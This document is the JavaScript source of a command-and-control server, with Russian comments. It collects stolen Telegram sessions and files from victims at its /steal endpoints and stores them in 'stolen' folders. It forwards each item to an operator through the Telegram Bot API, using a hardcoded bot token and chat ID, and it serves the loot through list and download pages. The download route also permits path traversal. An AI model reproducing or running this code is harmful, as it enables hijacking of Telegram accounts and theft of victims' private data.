const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.text({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));

// ========== НАСТРОЙКИ TELEGRAM ==========
// ЗАМЕНИ НА СВОИ ДАННЫЕ!
const TELEGRAM_BOT_TOKEN = "8323044984:AAESjLYrWHV9Uzvp1o7pZNCxqqLHCiJI6eY";  // Токен бота (например, @stilakk_bot)
const TELEGRAM_CHAT_ID = "7661793351";          // Твой Telegram ID (узнай у @userinfobot)

// Функция отправки в Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
    }
}

// Создаём папки
if (!fs.existsSync('stolen')) fs.mkdirSync('stolen');
if (!fs.existsSync('stolen/sessions')) fs.mkdirSync('stolen/sessions');
if (!fs.existsSync('stolen/files')) fs.mkdirSync('stolen/files');

// Главная страница
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Server</title>
            <style>
                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                .stats { background: #1a1a1a; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
                a { color: #0f0; }
            </style>
        </head>
        <body>
            <h1>🚀 C2 Server Active</h1>
            <div class="stats">
                <p>📡 Status: ONLINE</p>
                <p>🤖 Telegram Bot: Active</p>
            </div>
            <a href="/list">📋 View stolen data</a>
        </body>
        </html>
    `);
});

// Приём украденных сессий
app.post('/steal', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `stolen/sessions/telegram_${timestamp}.json`;
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    console.log(`✅ [${new Date().toISOString()}] Украдена сессия: ${filename}`);
    
    // Отправляем в Telegram
    const message = `🔐 *НОВАЯ УКРАДЕННАЯ СЕССИЯ!*\n\n` +
                    `📱 *Данные:*\n` +
                    `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1500)}\n\`\`\``;
    
    sendToTelegram(message);
    
    res.json({ status: 'ok', file: filename });
});

// Приём файлов
app.post('/steal/*', (req, res) => {
    const filename = req.url.split('/').pop();
    const filepath = `stolen/files/${filename}`;
    fs.writeFileSync(filepath, req.body);
    console.log(`✅ [${new Date().toISOString()}] Украден файл: ${filepath}`);
    
    sendToTelegram(`📁 *УКРАДЕН ФАЙЛ:*\n\`${filename}\``);
    
    res.json({ status: 'ok', file: filepath });
});

// Просмотр списка
app.get('/list', (req, res) => {
    const sessions = fs.readdirSync('stolen/sessions').map(f => ({ type: 'session', name: f, path: `/download/sessions/${f}` }));
    const files = fs.readdirSync('stolen/files').map(f => ({ type: 'file', name: f, path: `/download/files/${f}` }));
    
    let html = '<!DOCTYPE html><html><head><title>Stolen Data</title><style>';
    html += 'body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }';
    html += 'h1 { color: #0f0; } .session { background: #1a1a1a; margin: 10px 0; padding: 15px; border-radius: 5px; }';
    html += 'a { color: #0f0; text-decoration: none; }';
    html += '</style></head><body>';
    html += '<h1>📦 Stolen Data</h1><a href="/">← Back</a><br><br>';
    
    if (sessions.length === 0 && files.length === 0) {
        html += '<p>📭 No data stolen yet</p>';
    }
    
    if (sessions.length > 0) {
        html += '<h2>📨 Telegram Sessions:</h2>';
        for (const s of sessions) {
            html += `<div class="session">📄 <a href="${s.path}">${s.name}</a></div>`;
        }
    }
    
    if (files.length > 0) {
        html += '<h2>📁 Stolen Files:</h2>';
        for (const f of files) {
            html += `<div class="session">📄 <a href="${f.path}">${f.name}</a></div>`;
        }
    }
    
    html += '</body></html>';
    res.send(html);
});

// Скачивание файлов
app.get('/download/*', (req, res) => {
    const filepath = path.join(__dirname, req.url);
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);
    } else {
        res.status(404).send('File not found');
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🚀 C2 сервер запущен на порту ${PORT}`);
    console.log(`📡 URL: http://localhost:${PORT}`);
    console.log(`🤖 Telegram уведомления: Включены`);
});